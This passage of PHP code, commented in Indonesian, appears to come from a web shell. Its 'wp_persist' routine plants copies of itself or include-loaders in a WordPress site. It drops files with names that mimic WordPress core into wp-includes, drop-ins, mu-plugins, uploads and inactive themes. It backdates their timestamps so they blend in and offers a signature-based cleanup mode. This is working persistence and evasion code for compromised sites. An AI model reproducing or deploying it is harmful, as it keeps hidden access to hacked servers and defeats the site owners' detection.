...
switch ($action) {
    ...
    case 'wp_persist':
        // Auto-detect wp_root, lalu persist + relocate ke berbagai lokasi
        $ps_mode = $req['mode'] ?? 'persist'; // persist | relocate | cleanup
        $ps_self = __FILE__;
        $ps_self_content = @file_get_contents($ps_self);
        if ($ps_self_content === false) { $res = ['error' => 'Cannot read self']; break; }

        // Auto-detect WordPress root
        $ps_root = null;
        $ps_d = dirname($ps_self);
        for ($i = 0; $i < 8; $i++) {
            if (file_exists($ps_d . '/wp-config.php') && file_exists($ps_d . '/wp-includes/version.php')) {
                $ps_root = $ps_d;
                break;
            }
            $ps_d = dirname($ps_d);
        ...
        if (!$ps_root && !empty($_SERVER['DOCUMENT_ROOT'])) {
            $dr = realpath($_SERVER['DOCUMENT_ROOT']);
            if ($dr && file_exists($dr . '/wp-config.php')) $ps_root = $dr;
        }
        if (!$ps_root) { $res = ['error' => 'WordPress root not found']; break; }

        $ps_wpc = $ps_root . '/wp-content';
        $ps_wpi = $ps_root . '/wp-includes';

        // Nama file yang menyerupai file core WP
        $ps_locations = [
            // wp-includes (prioritas utama — ratusan file PHP, susah dicek manual)
            ['path' => $ps_wpi . '/class-wp-locale-cache.php',   'label' => 'wp-includes'],
            ['path' => $ps_wpi . '/class-wp-session-handler.php','label' => 'wp-includes'],
            ['path' => $ps_wpi . '/class-wp-text-util.php',      'label' => 'wp-includes'],
            ['path' => $ps_wpi . '/formatting-utils.php',        'label' => 'wp-includes'],
            ['path' => $ps_wpi . '/cache-compat.php',            'label' => 'wp-includes'],
            // Drop-ins (auto-load oleh WordPress)
            ['path' => $ps_wpc . '/object-cache.php',   'label' => 'drop-in (object-cache)', 'dropin' => true],
            ['path' => $ps_wpc . '/advanced-cache.php',  'label' => 'drop-in (advanced-cache)', 'dropin' => true],
            ['path' => $ps_wpc . '/db.php',              'label' => 'drop-in (db.php)', 'dropin' => true],
            // mu-plugins
            ['path' => $ps_wpc . '/mu-plugins/.loader.php',     'label' => 'mu-plugins'],
            ['path' => $ps_wpc . '/mu-plugins/wp-core-update.php', 'label' => 'mu-plugins'],
            // uploads (almost always writable)
            ['path' => $ps_wpc . '/uploads/.wp-cache.php',      'label' => 'uploads'],
            ['path' => $ps_wpc . '/uploads/.htaccess-cache.php', 'label' => 'uploads'],
            // themes — inactive theme lebih stealth
            ['path' => $ps_wpc . '/themes/twentytwentythree/parts/.cache.php', 'label' => 'inactive theme'],
            ['path' => $ps_wpc . '/themes/twentytwentyfour/parts/.cache.php',  'label' => 'inactive theme'],
        ];

        if ($ps_mode === 'cleanup') {
            // Hapus semua persistence files
            $cleaned = [];
            foreach ($ps_locations as $loc) {
                if (file_exists($loc['path'])) {
                    // Verifikasi ini file kita (cek signature)
                    $fc = @file_get_contents($loc['path']);
                    if ($fc !== false && (strpos($fc, 'X_DATA_KEY') !== false || strpos($fc, 'viper_crypto') !== false || strpos($fc, '@include_once') !== false)) {
                        if (@unlink($loc['path'])) {
                            $cleaned[] = $loc['path'];
                        }
                    }
            ...
            $res = ['status' => 'CLEANED', 'removed' => $cleaned, 'count' => count($cleaned)];
            break;
        }
        ...
        foreach ($ps_locations as $loc) {
            $target = $loc['path'];
            $label = $loc['label'];
            $is_dropin = $loc['dropin'] ?? false;

            // Skip kalau file sudah ada (jangan overwrite file asli)
            if (file_exists($target)) {
                // Cek apakah file ini milik kita
                $fc = @file_get_contents($target);
                if ($fc !== false && strpos($fc, 'X_DATA_KEY') !== false) {
                    $ps_results[] = ['path' => $target, 'label' => $label, 'status' => 'ALREADY_EXISTS'];
                    $ps_success++;
                } else {
                    $ps_results[] = ['path' => $target, 'label' => $label, 'status' => 'SKIP_REAL_FILE'];
                }
                continue;
            }
            ...
            if (!is_dir($parent)) {
                ...
                if (!is_dir($parent)) {
                    $ps_results[] = ['path' => $target, 'label' => $label, 'status' => 'DIR_FAILED'];
                    continue;
                }
            }

            if ($ps_mode === 'relocate') {
                // Relocate = full copy rev.php
                $ok = @file_put_contents($target, $ps_self_content);
                if ($ok !== false) {
                    @chmod($target, 0644);
                    // Ubah mtime agar blend in
                    $ref_files = @glob($parent . '/*.php');
                    if ($ref_files && count($ref_files) > 1) {
                        $ref_mtime = @filemtime($ref_files[0]);
                        if ($ref_mtime) @touch($target, $ref_mtime);
                    }
                    $ps_results[] = ['path' => $target, 'label' => $label, 'status' => 'OK'];
                    $ps_success++;
                } else {
                    $ps_results[] = ['path' => $target, 'label' => $label, 'status' => 'WRITE_FAILED'];
                }
            } else {
                // Persist = tiny include loader (smaller footprint)
                if ($is_dropin) {
                    // Drop-in: harus wrap agar tidak break WordPress
                    $loader = "<?php\n/* WP Drop-In */\n@include_once('" . addslashes($ps_self) . "');\n";
                } else {
                    $loader = "<?php\n@include_once('" . addslashes($ps_self) . "');\n";
                }
                $ok = @file_put_contents($target, $loader);
                if ($ok !== false) {
                    @chmod($target, 0644);
                    $ref_files = @glob($parent . '/*.php');
                    if ($ref_files && count($ref_files) > 1) {
